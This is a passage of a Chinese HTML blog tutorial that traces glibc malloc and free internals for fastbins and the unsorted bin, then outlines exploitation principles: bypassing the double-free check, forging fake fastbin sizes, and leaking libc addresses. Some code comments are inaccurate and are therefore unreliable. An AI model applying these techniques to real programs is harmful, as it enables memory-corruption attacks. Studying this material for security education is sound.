class="line-numbers language-C" data-language="C"><code class="language-C">else        &#123;          void *p &#x3D; sysmalloc (nb, av);          if (p !&#x3D; NULL)            alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h2 id="free到fastbin"><a href="#free到fastbin" class="headerlink" title="free到fastbin"></a>free到fastbin</h2><h3 id="源程序-1"><a href="#源程序-1" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-1"><a href="#运行过程-1" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>由源码中<code>strong_alias (__libc_free, free)</code>得出：<code>free</code>就是<code>__libc_free</code>的别名</p></li><li><p>调用<code>__libc_free</code>函数，传入的参数<code>*mem</code>是要释放的堆的<code>user data</code>地址的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __libc_free(void *mem)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>__free_hook</code>中的函数来完成释放，默认值为0，没有初始化的过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void (*hook) (void *, const void *)    &#x3D; atomic_forced_read (__free_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    &#123;      (*hook)(mem, RETURN_ADDRESS (0));      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断传入的指针值是否为0，free（0）无效</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (mem &#x3D;&#x3D; 0)                              &#x2F;* free(0) has no effect *&#x2F;    return;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>mem2chunk</code>函数，将<code>user data</code>的指针<code>mem</code>转换为对应的<code>chunk head</code>指针<code>p</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;mem2chunk函数宏定义&#x2F;&#x2F;chunk head与user data之间相差prev_size和size字段，分别占一个机器字节，因此从user data到chunlk head只需减去两个机器字长，即2*SIZE_SZ#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">p &#x3D; mem2chunk (mem);&#x2F;&#x2F;p指向chunk head<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>chunk_is_mmapped</code>函数判断该chunk是否由<code>mmap</code>分配</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunk_is_mmapped宏定义&#x2F;&#x2F;检查size最低三位中的标志位，若为2则是mmap分配的内存#define IS_MMAPPED 0x2#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>补充</strong>：使用<code>malloc</code> 、<code>free</code> 等函数动态申请和释放内存时真正与系统交互用于系统调用的函数主要是 <code>(s)brk</code> 函数以及 <code>mmap</code></p><ul><li><code>brk</code>用于分配小空间，将数据段(.data)的最高地址指针<code>_edata</code>往高地址推</li><li><code>mmap</code>用于分配大空间，是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</li><li>这两种方式分配的都是虚拟内存，没有分配物理内存</li></ul><p>源程序中释放的堆不是由<code>mmap</code>分配的因此跳过<code>if</code>中的内容</p></li><li><p>调用<code>arena_for_chunk</code>获取该<code>chunk</code>的分配区指针<code>ar_ptr</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ar_ptr &#x3D; arena_for_chunk (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>_int_free</code>函数释放堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_int_free (ar_ptr, p, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;_int_free函数定义，参数中的mstate表示的是malloc_state结构体也就是main_arena的结构体，mchunkptr表示的是malloc_chunk的结构体，av指向该chunk的分配区，p指向该chunk的chunk headstatic void _int_free (mstate av, mchunkptr p, int have_lock)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>chunksize</code>函数获取该<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunksize宏定义，取p所指向的chunk的size位#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查地址的合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;分配器永远不会在地址空间的末尾环绕，因此我们可以排除一些可能出现的尺寸值&#x2F;&#x2F;判断堆地址不在空间末尾且是对齐的，否则报无效地址的错误&#x2F;&#x2F;若互斥锁开启则关闭互斥锁if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr &#x3D; &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>检查大小合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;判断堆大小是大于最小值&#x2F;&#x2F;判断大小对齐，即是机器字长的整数倍数if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr &#x3D; &quot;free(): invalid size&quot;;      goto errout;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MINSIZE宏定义&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 两倍机器字长-1，结果将MIN_CHUNK_SIZE进行两倍机器字长对齐#define MINSIZE  \  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;aligned_OK宏定义，结果是判断是否是机器字长的整数倍#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) &#x3D;&#x3D; 0)&#x2F;&#x2F;MALLOC_ALIGN_MASK宏定义#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MIN_CHUNK_SIZE宏定义#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断堆是否在<code>fastbin</code>里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;大小小于等于fastbin最大值if ((unsigned long)(size) &lt;&#x3D; (unsigned long)(get_max_fast ())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查要释放的堆的下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;互斥锁是否开启&#x2F;&#x2F;下一个堆的大小是否小于最小堆大小或大于该内存池的user data最大值&#x2F;&#x2F;av指向chunk分配区if (have_lock    || (&#123; assert (locked &#x3D;&#x3D; 0);  mutex_lock(&amp;av-&gt;mutex);  locked &#x3D; 1;  chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ    || chunksize (chunk_at_offset (p, size)) &gt;&#x3D; av-&gt;system_mem;      &#125;))  &#123;    errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果互斥锁开启则关闭</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock)  &#123;    (void)mutex_unlock(&amp;av-&gt;mutex);    locked &#x3D; 0;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>清空堆中的内容</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;free_perturb函数定义&#x2F;&#x2F;p指向user data， n 为实际堆实际大小，即不含chunk head&#x2F;&#x2F;perturb：扰乱&#x2F;&#x2F;perturb_byte为0时，将堆的user data部分清空为0static voidfree_perturb (char *p, size_t n)&#123;  if (__glibc_unlikely (perturb_byte))    memset (p, perturb_byte, n);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置分配区的标志位表示<code>fastbin</code>有空闲<code>chunk</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;av的标志位设置为1set_fastchunks(av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;set_fastchunks宏定义#define set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)&#x2F;&#x2F;FASTCHUNKS_BIT宏定义#define FASTCHUNKS_BIT        (1U)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fastbin_index宏定义#define fastbin_index宏定义(sz) \  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ &#x3D;&#x3D; 8 ? 4 : 3)) - 2)   &#x2F;&#x2F;SIZE_SZ等于一个机器字长，32位右移1，64位右移2（除）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fb指向chunk大小所在的fastbin链的头指针unsigned int idx &#x3D; fastbin_index(size);fb &#x3D; &amp;fastbin (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查<code>double free</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将<code>chunk</code>添加到顶部之后检查顶部的 <code>fastbin </code>块的大小是否与我们要添加的块的大小相同。只有在我们拥有锁的情况下，我们才能解除对<code> OLD</code> 的引用</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;检查互斥锁&#x2F;&#x2F;old_idx为头结点所在的fastbin链的下标&#x2F;&#x2F;该chunk添加到fastbin中，即将fd设置为原来的头结点，并且把该chunk设置为头指针&#x2F;&#x2F;idx和old_idx不相等的时候报错if (have_lock &amp;&amp; old !&#x3D; NULL)  old_idx &#x3D; fastbin_index(chunksize(old));p-&gt;fd &#x3D; old2 &#x3D; old;      &#125;    while ((old &#x3D; catomic_compare_and_exchange_val_rel (fb, p, old2)) !&#x3D; old2);    if (have_lock &amp;&amp; old !&#x3D; NULL &amp;&amp; __builtin_expect (old_idx !&#x3D; idx, 0))      &#123;errstr &#x3D; &quot;invalid fastbin entry (free)&quot;;goto errout;      &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从fastbin取出chunk"><a href="#从fastbin取出chunk" class="headerlink" title="从fastbin取出chunk"></a>从fastbin取出chunk</h2><h3 id="源程序-2"><a href="#源程序-2" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-2"><a href="#运行过程-2" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断申请实际大小所在的<code>fastbin</code>链表的第一个结点是否为空</p></li><li><p>第一个结点不为空，则更改链表头指向第二个结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do       &#123;         victim &#x3D; pp;         if (victim &#x3D;&#x3D; NULL)           break;       &#125;     while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))            !&#x3D; victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>判断所取到的堆的大小所在<code>fastbin</code>的下标与申请的实际大小应该在的下标是否一致</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>计算并返回从fastbin获取的chunk的user data起始地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="fastbin相关漏洞和绕过利用原理"><a href="#fastbin相关漏洞和绕过利用原理" class="headerlink" title="fastbin相关漏洞和绕过利用原理"></a>fastbin相关漏洞和绕过利用原理</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>在<a href="#free%E5%88%B0fastbin">free到fastbin</a>中有对<code>double free</code>的判断机制</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>原理：</strong>连续两次释放同一个堆</p><p><strong>利用：</strong>判断要释放的堆所属的<code>fastbin</code>链的第一个<code>chunk</code>地址是否和要释放的堆的地址相同，若相同则判定为<code>double free</code>，因此绕过只需要保证二者地址不同即可，所以绕过方法是在第二次释放之前先释放一个属于这个链的堆使得第一个地址不是实际要释放的地址，第二次释放需要释放的地址时链表第一个地址就是两次释放之间释放的堆的地址，不会触发<code>double free</code>的报错。</p><h3 id="绕过对取出的堆的大小检查"><a href="#绕过对取出的堆的大小检查" class="headerlink" title="绕过对取出的堆的大小检查"></a>绕过对取出的堆的大小检查</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>find_fake_fast</code>工具寻找离所求地址最近的可以伪造<code>size</code>位符合要求的堆</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h2 id="free到unsorted-bin"><a href="#free到unsorted-bin" class="headerlink" title="free到unsorted bin"></a>free到unsorted bin</h2><h3 id="源程序-3"><a href="#源程序-3" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-3"><a href="#运行过程-3" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#free%E5%88%B0fastbin">free到fastbin</a>的判断堆是否在<code>fastbin</code>里</p></li><li><p>不在<code>fastbin</code>之后判断是否是<code>mmap</code>分配的，不是则继续运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (!chunk_is_mmapped(p)) &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果没有互斥锁则加锁</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked &#x3D; 1;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获得下一个<code>chunk</code>的大小和指针到<code>p</code>和<code>size</code>，即<code>p</code>指向下一个<code>chunk</code>的地址，<code>size</code>为下一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextchunk &#x3D; chunk_at_offset(p, size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查该地址是否在分配区顶部，是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (p &#x3D;&#x3D; av-&gt;top))      &#123;errstr &#x3D; &quot;double free or corruption (top)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>av</code>为堆所在的分配区地址</p></li><li><p>判断下一个堆是否超出分配区的范围，判断方式：判断下一个堆的地址是否大于等于<code>av-&gt;top</code>加上<code>av-&gt;top</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (contiguous (av)  &amp;&amp; (char *) nextchunk  &gt;&#x3D; ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))     &#123;errstr &#x3D; &quot;double free or corruption (out)&quot;;goto errout;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断要释放的堆是否在<code>inuse</code>状态，判断方式：获取下一个堆的<code>prev_inuse</code>值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;errstr &#x3D; &quot;double free or corruption (!prev)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取下一个堆的大小并且判断下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextsize &#x3D; chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)|| __builtin_expect (nextsize &gt;&#x3D; av-&gt;system_mem, 0))      &#123;errstr &#x3D; &quot;free(): invalid next size (normal)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>清空堆中的内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断前一个堆是否被释放，如果被释放了则和前一个堆合并：获取前一个堆的大小，加到当前要释放的堆的<code>size</code>，并通过<a href="#unlink">unlink</a>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;      prevsize &#x3D; p-&gt;prev_size;      size +&#x3D; prevsize;      p &#x3D; chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断下一个堆是否是<code>top chunk</code>,若是则与<code>top chunk</code>合并，<strong>结束释放过程</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;...&#125;else &#123;      size +&#x3D; nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top &#x3D; p;      check_chunk(av, p);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是，获取下一个堆的<code>inuse</code>位</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextinuse &#x3D; inuse_bit_at_offset(nextchunk, nextsize);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断下一个堆是否在使用，若已经被释放则合并到当前要释放的堆，并通过<code>unlink</code>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>若还在使用则将<code>prev_inuse</code>设为0表示当前堆已经被释放了</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#125; elseclear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取分配区中的<code>unsorted_bin</code>的第一个堆的地址到<code>bck</code>，获取头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks(av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查<code>fwd</code>的<code>bk</code>是否是<code>bck</code>，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#123;  errstr &#x3D; &quot;free(): corrupted unsorted chunks&quot;;  goto errout;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将堆连接到<code>unsorted bin</code>中，即将要释放的堆的<code>fd</code>改成<code>fwd</code>，<code>bk</code>改成<code>bck</code>，<code>bck</code>的<code>fd</code>和<code>fwd</code>的<code>bk</code>设置成<code>p</code>，将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为第一个，并且堆大小不在<code>smallbin</code>范围内时设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>为NULL</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">  p-&gt;fd &#x3D; fwd;     p-&gt;bk &#x3D; bck;     if (!in_smallbin_range(size))&#123;  p-&gt;fd_nextsize &#x3D; NULL;  p-&gt;bk_nextsize &#x3D; NULL;&#125;     bck-&gt;fd &#x3D; p;     fwd-&gt;bk &#x3D; p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从unsorted-bin取出chunk"><a href="#从unsorted-bin取出chunk" class="headerlink" title="从unsorted bin取出chunk"></a>从unsorted bin取出chunk</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-4"><a href="#运行过程-4" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的调用<code>malloc_consolidate </code>整理<code>fastbins</code></p></li><li><p>进入整理<code>unsorted bin</code>的大循环，一边整理一边查找合适的<code>chunk</code>，找到即返回，结束创建过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int iters &#x3D; 0;while ((victim &#x3D; unsorted_chunks (av)-&gt;bk) !&#x3D; unsorted_chunks (av))    bck &#x3D; victim-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结束条件：遍历整理完<code>unsorted bin</code>或整理次数超过10000 </p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define MAX_ITERS       10000          if (++iters &gt;&#x3D; MAX_ITERS)            break;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第二个堆并且进行大小检查</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; victim-&gt;bk;if (__builtin_expect (victim-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))  malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                   chunk2mem (victim), av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第一个<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>unsorted bin</code>的第一个<code>chunk</code>与所申请<code>chunk</code>精确匹配则直接返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take now instead of binning if exact fit *&#x2F;          if (size &#x3D;&#x3D; nb)            &#123;              set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;将匹配的的chunk设置为inuse              if (av !&#x3D; &amp;main_arena)                victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;若分配区非main_arena则设置为NON_MAIN_ARENA              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);&#x2F;&#x2F;返回堆的user data地址              alloc_perturb (p, bytes);              return p;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="unsorted-bin相关漏洞和绕过利用原理"><a href="#unsorted-bin相关漏洞和绕过利用原理" class="headerlink" title="unsorted bin相关漏洞和绕过利用原理"></a>unsorted bin相关漏洞和绕过利用原理</h2><h3 id="利用unsorted-bin泄露libc地址"><a href="#利用unsorted-bin泄露libc地址" class="headerlink" title="利用unsorted bin泄露libc地址"></a>利用unsorted bin泄露libc地址</h3><ul><li><p>释放一个堆到<code>unsorted bin</code>之后输出这个堆的<code>fd</code></p><ul><li>原理：将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为倒数第二个堆的过程中时<code>fwd = bck = main_arena  </code> ，连接之后被释放的堆的<code>fd</code>和<code>bk</code>均指向<code>main_arena</code></li></ul></li><li><p>两个相同大小的unsorted bin合并，申请一个相同大小的堆块，此时残留fd，可以泄露libc</p><ul><li><p>原理： 判断下一个堆已经被释放合并到当前要释放的堆并通过<code>unlink</code>将该chunk从空闲链表中脱离的时候不会清空堆里的内容，所以两个堆合并的时候保留了<code>fd</code>和<code>bk</code>，在申请的时候只要不覆盖掉堆里的内容就能够把<code>main_arena</code>地址申请出来，两个堆必须地址连续</p><pre class="line-numbers language-C" 